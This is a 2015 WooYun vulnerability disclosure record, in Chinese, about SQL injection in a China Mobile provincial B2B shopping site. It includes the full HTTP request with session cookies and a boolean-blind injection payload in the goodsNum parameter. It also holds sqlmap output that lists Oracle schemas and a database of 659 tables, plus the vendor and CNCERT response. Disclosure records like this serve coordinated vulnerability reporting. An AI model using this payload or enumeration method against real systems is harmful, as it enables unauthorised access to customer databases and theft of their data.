{"id": 72564, "wybug_id": "wooyun-2015-0156025", "wybug_title": "中国移动10086.cn某省级站点SQL注入涉及大量数据", "wybug_corp": "中国移动", "wybug_author": "greg.wu", "wybug_date": "2015-11-26 14:36", "wybug_open_date": "2016-01-14 14:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向公众公开  简要描述： 中国移动10086.cn某省级站点SQL注入涉及大量数据 详细说明：  江苏移动b2b商城的注入，oracle数据库，可以直接用sqlmap跑\nPOST /b2b/actionDispatcher.do HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: */*Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**/b2b/goods/UUPO-U8.jspContent-Length: 88Cookie: bi-user-id=141309163362895; WT_FPC=id=2e40e16cec67a0884481414484686765:lv=1448563543832:ss=1448563522116; tK1gTQFA2C=MDAwM2IyYThiNjAwMDAwMDAwNjQwQXgvWR0xNDQ4NTM1ODk0; B2B_JSESSIONID=qqrCWW2hTSZvSpZydDDTS1GBYbpr1GN1Sn0h9gT01GR1ndY1vjcB!382508210; __utma=231257732.265260302.1448563524.1448563524.1448563524.1; __utmb=231257**.**.**.**8563524; __utmc=231257732; __utmz=231257732.1448563524.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; fpyUjfj0NP=MDAwM2IyYThiNjAwMDAwMDAwMzIwVC9ACVkxNDQ4NTM1OTEzConnection: keep-alivePragma: no-cacheCache-Control: no-cachereqUrl=goodsDetailPrice&goodsNum=JSYD-LENOVO-A278T-01&supplierNum=99100012\ngoodsNum存在注入。poc：goodsNum=JSYD-LENOVO-A278T-01') AND 1363=1363 AND ('1'='1   漏洞证明：  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: goodsNum    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: reqUrl=goodsDetailPrice&goodsNum=JSYD-LENOVO-A278T-01') AND 1517=1517 AND ('cKNd'='cKNd&supplierNum=99100012---[02:49:10] [INFO] the back-end DBMS is Oracleweb application technology: Servlet 3.0, JSP 2.2, Nginxback-end DBMS: Oracle[02:49:10] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[02:49:10] [INFO] fetching database (schema) names[02:49:10] [INFO] fetching number of databases[02:49:10] [INFO] resumed: 4[02:49:10] [INFO] resumed: KFZXBTB[02:49:10] [INFO] resumed: SYS[02:49:10] [INFO] resumed: SYSTEM[02:49:10] [INFO] resumed: TSMS1available databases [4]:[*] KFZXBTB[*] SYS[*] SYSTEM[*] TSMS1当前库里有659张表，涉及到password字段的表有8张web application technology: Servlet 3.0, JSP 2.2, Nginxback-end DBMS: Oracle[03:02:38] [INFO] fetching tables for database: 'KFZXBTB'[03:02:38] [INFO] fetching number of tables for database 'KFZXBTB'[03:02:38] [INFO] retrieved: 659   修复方案：  过滤，参数化   版权声明：转载请注明来源 greg.wu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-30 14:53 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向中国移动集团公司通报，由其后续协调网站管理部门处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}